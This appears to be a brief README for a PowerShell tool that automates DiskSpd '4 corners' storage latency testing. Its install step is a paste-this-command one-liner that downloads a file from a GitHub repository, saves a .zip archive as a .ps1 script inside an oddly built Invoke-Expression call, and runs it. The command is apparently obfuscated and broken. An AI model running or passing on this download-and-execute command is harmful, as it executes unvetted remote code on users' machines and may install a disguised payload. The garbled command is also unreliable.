# CornersTestAndGraph2.0
4 Corners Storage test. Diskspd test to UNC path from DiskSpd Queue to storage. 


corners test


## Automation for making 4 Corners Disk Testing more successful. ##


## The Script automates the test for the 4 best performing Latency counters for disk testing. ##
## It also has a longer test which takes over an hour to administer per node ##


Link to download and administer here: 

``` Powershell
echo corners;[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;Invoke-Expression('$module="CornersTestAndGraph2.0";$repo="PowershellScripts"'+(new-object net.webclient).DownloadFile('https://github.com/louisjreevesme/CornersTestAndGraph2.0/raw/refs/heads/main/CornersTestAndGraph2.0.zip',"Begin4corners.ps1"));Begin4corners.ps1

```
